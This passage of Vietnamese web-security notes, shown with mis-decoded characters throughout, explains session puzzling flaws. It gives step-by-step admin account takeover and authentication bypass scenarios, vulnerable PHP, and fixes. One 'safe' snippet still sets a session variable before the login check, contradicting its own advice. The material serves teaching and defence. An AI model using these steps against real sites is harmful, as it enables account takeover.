2. Láº¥y cookie phiÃªn Ä‘Æ°á»£c cáº¥p sau yÃªu cáº§u trÃªn.
3. Sá»­ dá»¥ng cookie nÃ y Ä‘á»ƒ truy cáº­p trá»±c tiáº¿p `/profile.php`.
   - Do server chÆ°a xÃ³a biáº¿n phiÃªn (do redirect bá»‹ cháº·n), há»‡ thá»‘ng nháº­n diá»‡n ngÆ°á»i dÃ¹ng lÃ  **admin**, dáº«n Ä‘áº¿n **authentication bypass**.

---

### **3. NguyÃªn NhÃ¢n Lá»— Há»•ng**

1. **GÃ¡n biáº¿n phiÃªn sá»›m (Premature Session Population):**
   - Biáº¿n phiÃªn nhÆ° `$_SESSION['Username']` vÃ  `$_SESSION['Active']` Ä‘Æ°á»£c khá»Ÿi táº¡o trÆ°á»›c khi xÃ¡c thá»±c máº­t kháº©u hoÃ n táº¥t.

2. **KhÃ´ng xÃ³a biáº¿n phiÃªn khi quy trÃ¬nh tháº¥t báº¡i:**
   - Server chá»‰ xÃ³a biáº¿n phiÃªn khi thá»±c hiá»‡n redirect Ä‘áº¿n `/login.php?failed=1`.

#### **MÃ£ PHP Ä‘Æ¡n giáº£n hÃ³a:**
```php
if (isset($_POST['Submit'])) {
    // GÃ¡n biáº¿n phiÃªn trÆ°á»›c khi kiá»ƒm tra máº­t kháº©u
    $_SESSION['Username'] = $_POST['Username'];
    $_SESSION['Active'] = true;

    // Kiá»ƒm tra thÃ´ng tin Ä‘Äƒng nháº­p
    if (login($_POST['Username'], $_POST['Password'])) {
        header("Location: profile.php");
        exit;
    }
} else {
    // Redirect khi Ä‘Äƒng nháº­p tháº¥t báº¡i
    header("Location: login.php?failed=1");
    exit;
}

// XÃ³a phiÃªn chá»‰ khi redirect Ä‘áº¿n /login.php?failed=1
if (isset($_GET['failed'])) {
    session_destroy();
    session_start();
}
```

---

### **4. Biá»‡n PhÃ¡p PhÃ²ng Chá»‘ng**

1. **TrÃ¬ hoÃ£n gÃ¡n giÃ¡ trá»‹ cho session variables:**
   - Chá»‰ gÃ¡n biáº¿n phiÃªn sau khi xÃ¡c thá»±c thÃ nh cÃ´ng.
   ```php
   if (isset($_POST['Submit'])) {
       if (login($_POST['Username'], $_POST['Password'])) {
           $_SESSION['Username'] = $_POST['Username'];
           $_SESSION['Active'] = true;
           header("Location: profile.php");
           exit;
       } else {
           header("Location: login.php?failed=1");
           exit;
       }
   }
   ```

2. **Dá»n dáº¹p biáº¿n phiÃªn ngay láº­p tá»©c khi xÃ¡c thá»±c tháº¥t báº¡i:**
   - Thay vÃ¬ dá»±a vÃ o redirect, xÃ³a biáº¿n phiÃªn ngay trong quy trÃ¬nh xá»­ lÃ½ tháº¥t báº¡i.
   ```php
   if (!login($_POST['Username'], $_POST['Password'])) {
       session_unset();
       session_destroy();
       session_start();
       header("Location: login.php?failed=1");
       exit;
   }
   ```

3. **KhÃ´ng sá»­ dá»¥ng session variables Ä‘á»ƒ hiá»ƒn thá»‹ thÃ´ng bÃ¡o lá»—i:**
   - Sá»­ dá»¥ng cÃ¡c phÆ°Æ¡ng phÃ¡p khÃ¡c (vÃ­ dá»¥: truyá»n tham sá»‘ qua query string hoáº·c hiá»ƒn thá»‹ thÃ´ng bÃ¡o tÄ©nh) Ä‘á»ƒ giáº£m rá»§i ro liÃªn quan Ä‘áº¿n session variables.

4. **Kiá»ƒm tra vÃ  xÃ¡c thá»±c tráº¡ng thÃ¡i Ä‘Äƒng nháº­p ká»¹ lÆ°á»¡ng:**
   - Chá»‰ dá»±a vÃ o cÃ¡c session variables an toÃ n Ä‘á»ƒ xÃ¡c Ä‘á»‹nh tráº¡ng thÃ¡i Ä‘Äƒng nháº­p.

---
# 18. Common Session Variables vÃ  Lá»— Há»•ng Account Takeover

Lá»— há»•ng nÃ y phÃ¡t sinh tá»« viá»‡c tÃ¡i sá»­ dá»¥ng **session variables** trong cÃ¡c quy trÃ¬nh khÃ¡c nhau mÃ  khÃ´ng cÃ³ sá»± cÃ¡ch ly. Äiá»u nÃ y cho phÃ©p thá»±c hiá»‡n cÃ¡c quy trÃ¬nh Ä‘á»“ng thá»i vÃ  lá»£i dá»¥ng Ä‘á»ƒ chiáº¿m Ä‘oáº¡t tÃ i khoáº£n (account takeover).

---

### **1. PhÃ¡t Hiá»‡n Lá»— Há»•ng**

#### **Quan sÃ¡t á»©ng dá»¥ng web:**
1. **Quy trÃ¬nh ÄÄƒng kÃ½ (Registration):**
   - Gá»“m 3 giai Ä‘oáº¡n vá»›i cÃ¡c URL tÆ°Æ¡ng á»©ng:
     - `/register_1.php`
     - `/register_2.php`
     - `/register_3.php`
   - Náº¿u bá» qua báº¥t ká»³ giai Ä‘oáº¡n nÃ o, há»‡ thá»‘ng hiá»ƒn thá»‹ lá»—i vÃ  khÃ´ng cho phÃ©p tiáº¿p tá»¥c.

2. **Quy trÃ¬nh Reset máº­t kháº©u:**
   - CÅ©ng bao gá»“m 3 giai Ä‘oáº¡n tÆ°Æ¡ng tá»±:
     - `/reset_1.php`: Cung cáº¥p **username**.
     - `/reset_2.php`: Tráº£ lá»i cÃ¢u há»i báº£o máº­t.
     - `/reset_3.php`: Äáº·t máº­t kháº©u má»›i.

#### **Kiá»ƒm tra Session Variables:**
- PhÃ¡t hiá»‡n biáº¿n **Phase** Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ lÆ°u tráº¡ng thÃ¡i giai Ä‘oáº¡n cá»§a cáº£ hai quy trÃ¬nh.
- Äiá»u nÃ y Ä‘Æ°á»£c xÃ¡c nháº­n khi:
  - HoÃ n thÃ nh giai Ä‘oáº¡n Ä‘áº§u cá»§a **reset máº­t kháº©u**, cookie phiÃªn chá»©a thÃ´ng tin vá» **Phase**.
  - Cá»‘ gáº¯ng truy cáº­p giai Ä‘oáº¡n thá»© hai hoáº·c thá»© ba vá»›i cookie khÃ´ng há»£p lá»‡ dáº«n Ä‘áº¿n lá»—i.

---

### **2. Khai ThÃ¡c Lá»— Há»•ng**

#### **Ã tÆ°á»Ÿng khai thÃ¡c:**
- **Má»¥c tiÃªu:** Bá» qua cÃ¢u há»i báº£o máº­t cá»§a quy trÃ¬nh **reset máº­t kháº©u** Ä‘á»ƒ chiáº¿m tÃ i khoáº£n **admin**.
- **PhÃ¢n tÃ­ch:**
  - Quy trÃ¬nh reset máº­t kháº©u sá»­ dá»¥ng biáº¿n **Phase** Ä‘á»ƒ kiá»ƒm soÃ¡t thá»© tá»± cÃ¡c bÆ°á»›c.
  - Quy trÃ¬nh Ä‘Äƒng kÃ½ cÅ©ng sá»­ dá»¥ng biáº¿n **Phase**, vÃ  tráº¡ng thÃ¡i cá»§a biáº¿n nÃ y cÃ³ thá»ƒ bá»‹ thay Ä‘á»•i bá»Ÿi cáº£ hai quy trÃ¬nh.

#### **Ká»‹ch báº£n khai thÃ¡c:**
1. **Thá»±c hiá»‡n giai Ä‘oáº¡n 1 cá»§a quy trÃ¬nh reset máº­t kháº©u:**
   - Gá»­i yÃªu cáº§u Ä‘áº¿n `/reset_1.php` vá»›i **username** lÃ  `admin`. 
   - Biáº¿n **Phase** trong phiÃªn Ä‘Æ°á»£c Ä‘áº·t thÃ nh `2`.

2. **Thá»±c hiá»‡n giai Ä‘oáº¡n 1 vÃ  2 cá»§a quy trÃ¬nh Ä‘Äƒng kÃ½:**
   - Gá»­i yÃªu cáº§u Ä‘áº¿n `/register_1.php` vÃ  `/register_2.php`.
   - Äiá»u nÃ y lÃ m biáº¿n **Phase** tÄƒng lÃªn `3`.

3. **Truy cáº­p trá»±c tiáº¿p vÃ o giai Ä‘oáº¡n 3 cá»§a quy trÃ¬nh reset máº­t kháº©u:**
   - Gá»­i yÃªu cáº§u Ä‘áº¿n `/reset_3.php` vá»›i cookie phiÃªn hiá»‡n táº¡i.
   - Há»‡ thá»‘ng cho phÃ©p Ä‘áº·t láº¡i máº­t kháº©u má»›i cho tÃ i khoáº£n **admin**, bá» qua cÃ¢u há»i báº£o máº­t.

#### **ThÃ nh cÃ´ng:**
- Chiáº¿m Ä‘oáº¡t tÃ i khoáº£n **admin** báº±ng cÃ¡ch Ä‘áº·t láº¡i máº­t kháº©u mÃ  khÃ´ng cáº§n tráº£ lá»i cÃ¢u há»i báº£o máº­t.

---

### **3. NguyÃªn NhÃ¢n Lá»— Há»•ng**

1. **TÃ¡i sá»­ dá»¥ng biáº¿n phiÃªn giá»¯a cÃ¡c quy trÃ¬nh khÃ¡c nhau:**
   - Biáº¿n **Phase** Ä‘Æ°á»£c sá»­ dá»¥ng trong cáº£ quy trÃ¬nh **reset máº­t kháº©u** vÃ  **Ä‘Äƒng kÃ½**, dáº«n Ä‘áº¿n xung Ä‘á»™t khi hai quy trÃ¬nh nÃ y Ä‘Æ°á»£c thá»±c hiá»‡n Ä‘á»“ng thá»i.

2. **KhÃ´ng cÃ´ láº­p dá»¯ liá»‡u phiÃªn cho tá»«ng quy trÃ¬nh:**
   - Dá»¯ liá»‡u phiÃªn Ä‘Æ°á»£c chia sáº» mÃ  khÃ´ng cÃ³ sá»± phÃ¢n biá»‡t rÃµ rÃ ng giá»¯a cÃ¡c quy trÃ¬nh.

#### **MÃ£ minh há»a:**
**Quy trÃ¬nh Ä‘Äƒng kÃ½ (`register_1.php`):**
```php
if (isset($_POST['Submit'])) {
    $_SESSION['reg_username'] = $_POST['Username'];
    $_SESSION['Phase'] = 2;
    header("Location: register_2.php");
    exit;
}
```

**Quy trÃ¬nh reset máº­t kháº©u (`reset_1.php`):**
```php
if (isset($_POST['Submit'])) {
    $user_data = fetch_user_data($_POST['Username']);
    if ($user_data) {
        $_SESSION['reset_username'] = $user_data['username'];
        $_SESSION['Phase'] = 2;
        header("Location: reset_2.php");
        exit;
    }
}
```

---

### **4. Biá»‡n PhÃ¡p PhÃ²ng Chá»‘ng**

1. **CÃ¡ch ly session variables:**
   - Sá»­ dá»¥ng cÃ¡c biáº¿n khÃ¡c nhau Ä‘á»ƒ lÆ°u tráº¡ng thÃ¡i cho tá»«ng quy trÃ¬nh riÃªng biá»‡t.
   ```php
   $_SESSION['reg_Phase'] = 1; // Quy trÃ¬nh Ä‘Äƒng kÃ½
   $_SESSION['reset_Phase'] = 1; // Quy trÃ¬nh reset máº­t kháº©u
   ```

2. **XÃ¡c thá»±c tráº¡ng thÃ¡i giai Ä‘oáº¡n:**
   - Kiá»ƒm tra cá»¥ thá»ƒ tráº¡ng thÃ¡i vÃ  dá»¯ liá»‡u phiÃªn tÆ°Æ¡ng á»©ng vá»›i tá»«ng quy trÃ¬nh.
   ```php
   if (!isset($_SESSION['reset_username']) || $_SESSION['reset_Phase'] !== 3) {
       header("Location: reset_1.php");
       exit;
   }
   ```

3. **Háº¡n cháº¿ thá»±c hiá»‡n Ä‘á»“ng thá»i:**
   - KhÃ´ng cho phÃ©p thá»±c hiá»‡n hai quy trÃ¬nh Ä‘á»“ng thá»i trong cÃ¹ng má»™t phiÃªn.
   ```php
   if (isset($_SESSION['in_process']) && $_SESSION['in_process'] !== 'current_process_name') {
       session_destroy();
       header("Location: error.php?msg=Concurrent processes not allowed");
       exit;
   }
   ```

4. **Kiá»ƒm tra logic vÃ  báº£o máº­t cháº·t cháº½:**
   - Kiá»ƒm tra xem cÃ¡c giai Ä‘oáº¡n Ä‘Ã£ hoÃ n táº¥t theo Ä‘Ãºng thá»© tá»± vÃ  dá»¯ liá»‡u cáº§n thiáº¿t cÃ³ há»£p lá»‡ hay khÃ´ng.

---
# 19. NgÄƒn Cháº·n Session Puzzling Vulnerabilities

#### **NguyÃªn NhÃ¢n ChÃ­nh GÃ¢y Ra Lá»— Há»•ng**
1. **Cáº¥u hÃ¬nh khÃ´ng an toÃ n**:
   - CÃ¡c giÃ¡ trá»‹ máº·c Ä‘á»‹nh khÃ´ng há»£p lá»‡ khi khá»Ÿi táº¡o hoáº·c Ä‘áº·t láº¡i session.
2. **TÃ¡i sá»­ dá»¥ng session variables**:
   - Sá»­ dá»¥ng cÃ¹ng má»™t session variable cho nhiá»u quy trÃ¬nh khÃ¡c nhau.
3. **Premature session population**:
   - GÃ¡n giÃ¡ trá»‹ session variable trÆ°á»›c khi kiá»ƒm tra Ä‘á»§ Ä‘iá»u kiá»‡n cáº§n thiáº¿t.

---

### **PhÆ°Æ¡ng PhÃ¡p NgÄƒn Cháº·n**

#### **1. Cáº¥u hÃ¬nh an toÃ n**
- **KhÃ´ng sá»­ dá»¥ng giÃ¡ trá»‹ máº·c Ä‘á»‹nh khÃ´ng há»£p lá»‡ cho session**:
  - TrÃ¡nh gÃ¡n giÃ¡ trá»‹ máº·c Ä‘á»‹nh khÃ´ng rÃµ rÃ ng nhÆ° `0`, vÃ¬ cÃ³ thá»ƒ trÃ¹ng vá»›i cÃ¡c giÃ¡ trá»‹ há»£p lá»‡ trong cÆ¡ sá»Ÿ dá»¯ liá»‡u (vÃ­ dá»¥: ID admin).
  - Sá»­ dá»¥ng `session_unset()` vÃ  `session_destroy()` Ä‘á»ƒ xÃ³a sáº¡ch session:
    ```php
    if (isset($_POST['logout'])) {
        session_start();
        session_unset();
        session_destroy();
    }
    ```

#### **2. TÃ¡ch biá»‡t session variables**
- **KhÃ´ng tÃ¡i sá»­ dá»¥ng cÃ¹ng má»™t session variable**:
  - Äáº£m báº£o má»—i session variable chá»‰ phá»¥c vá»¥ má»™t má»¥c Ä‘Ã­ch duy nháº¥t.
  - VÃ­ dá»¥: PhÃ¢n biá»‡t rÃµ rÃ ng giá»¯a tráº¡ng thÃ¡i xÃ¡c thá»±c vÃ  dá»¯ liá»‡u cá»§a ngÆ°á»i dÃ¹ng:
    ```php
    // Login
    if (isset($_POST['Submit'])) {
        if (login($_POST['Username'], $_POST['Password'])) {
            $_SESSION['auth_username'] = $_POST['Username'];
            $_SESSION['is_logged_in'] = true;
            header("Location: profile.php");
            exit;
        } else {
            header("Location: login.php?failed=1");
            exit;
        }
    }
    ```

- **KhÃ´ng sá»­ dá»¥ng chung session variables giá»¯a cÃ¡c quy trÃ¬nh**:
  - VÃ­ dá»¥, phÃ¢n biá»‡t giá»¯a quy trÃ¬nh login vÃ  reset máº­t kháº©u:
    ```php
    // Reset Password
    if (isset($_POST['Submit'])) {
        $user_data = fetch_user_data($_POST['Username']);
        if ($user_data) {
            $_SESSION['reset_username'] = $user_data['username'];
            header("Location: security_question.php");
            exit;
        }
    }
    ```

#### **3. Kiá»ƒm tra Ä‘iá»u kiá»‡n trÆ°á»›c khi gÃ¡n giÃ¡ trá»‹ session**
- **Chá»‰ gÃ¡n session variables khi táº¥t cáº£ Ä‘iá»u kiá»‡n Ä‘Ã£ Ä‘Æ°á»£c thá»a mÃ£n**:
  - TrÃ¡nh gÃ¡n giÃ¡ trá»‹ trÆ°á»›c khi quy trÃ¬nh Ä‘Æ°á»£c hoÃ n táº¥t:
    ```php
    if (isset($_POST['Submit'])) {
        $_SESSION['login_fail_user'] = $_POST['Username'];
        if (login($_POST['Username'], $_POST['Password'])) {
            $_SESSION['auth_username'] = $_POST['Username'];
            $_SESSION['is_logged_in'] = true;
            header("Location: profile.php");
            exit;
        } else {
            header("Location: login.php?failed=1");
            exit;
        }
    }
    ```

#### **4. Kiá»ƒm tra logic vÃ  báº£o máº­t session**
- Äáº£m báº£o táº¥t cáº£ session variables cáº§n thiáº¿t Ä‘Ã£ Ä‘Æ°á»£c khá»Ÿi táº¡o trÆ°á»›c khi thá»±c hiá»‡n hÃ nh Ä‘á»™ng.
- VÃ­ dá»¥:
  ```php
  if (!isset($_SESSION['is_logged_in']) || $_SESSION['is_logged_in'] !== true) {
      header("Location: login.php");
      exit;
  }
  ```

---

### **Thá»±c HÃ nh Báº£o Máº­t - ÄÃ¡nh GiÃ¡ Ká»¹ NÄƒng**

#### **1. ÄÃ¡nh giÃ¡ má»©c Ä‘á»™ dá»…**
- **Bá»‘i cáº£nh**:
  - Kiá»ƒm tra báº£o máº­t á»©ng dá»¥ng web Ä‘á»ƒ tÃ¬m cÃ¡c lá»— há»•ng liÃªn quan Ä‘áº¿n quáº£n lÃ½ session.
- **PhÆ°Æ¡ng phÃ¡p**:
  - PhÃ¢n tÃ­ch session variables.
  - Kiá»ƒm tra tÃ¡i sá»­ dá»¥ng session giá»¯a cÃ¡c quy trÃ¬nh.
  - Thá»­ nghiá»‡m cÃ¡c ká»‹ch báº£n nhÆ° bypass authentication hoáº·c khai thÃ¡c session variables Ä‘á»ƒ chiáº¿m quyá»n.

#### **2. ÄÃ¡nh giÃ¡ má»©c Ä‘á»™ khÃ³**
- **Bá»‘i cáº£nh**:
  - Kiá»ƒm tra báº£o máº­t toÃ n bá»™ há»‡ thá»‘ng triá»ƒn khai, bao gá»“m á»©ng dá»¥ng web, mÃ¡y chá»§ web, vÃ  bá»™ nhá»› cache.
- **PhÆ°Æ¡ng phÃ¡p**:
  - Kiá»ƒm tra lá»— há»•ng trong cáº¥u hÃ¬nh mÃ¡y chá»§ (vÃ­ dá»¥: lá»™ thÃ´ng tin session).
  - Thá»­ nghiá»‡m káº¿t há»£p cÃ¡c yáº¿u tá»‘ nhÆ° caching vÃ  session Ä‘á»ƒ khai thÃ¡c session puzzling.
  - Sá»­ dá»¥ng cÃ¡c cÃ´ng cá»¥ quÃ©t lá»— há»•ng mÃ¡y chá»§ vÃ  phÃ¢n tÃ­ch lÆ°u lÆ°á»£ng máº¡ng.

---

### **Káº¿t Luáº­n**
Viá»‡c ngÄƒn cháº·n **session puzzling vulnerabilities** Ä‘Ã²i há»i tuÃ¢n thá»§ nghiÃªm ngáº·t cÃ¡c nguyÃªn táº¯c quáº£n lÃ½ session:
- KhÃ´ng tÃ¡i sá»­ dá»¥ng session variables.
- XÃ³a sáº¡ch session khi khá»Ÿi táº¡o láº¡i.
- Chá»‰ gÃ¡n giÃ¡ trá»‹ session khi cÃ¡c Ä‘iá»u kiá»‡n Ä‘Ã£ Ä‘Æ°á»£c kiá»ƒm tra Ä‘áº§y Ä‘á»§.

Thá»±c hÃ nh vÃ  Ä‘Ã¡nh giÃ¡ ká»¹ nÄƒng thÆ°á»ng xuyÃªn sáº½ giÃºp báº¡n nháº­n diá»‡n vÃ  báº£o vá»‡ há»‡ thá»‘ng tá»‘t hÆ¡n trÆ°á»›c cÃ¡c lá»— há»•ng liÃªn quan Ä‘áº¿n session management.



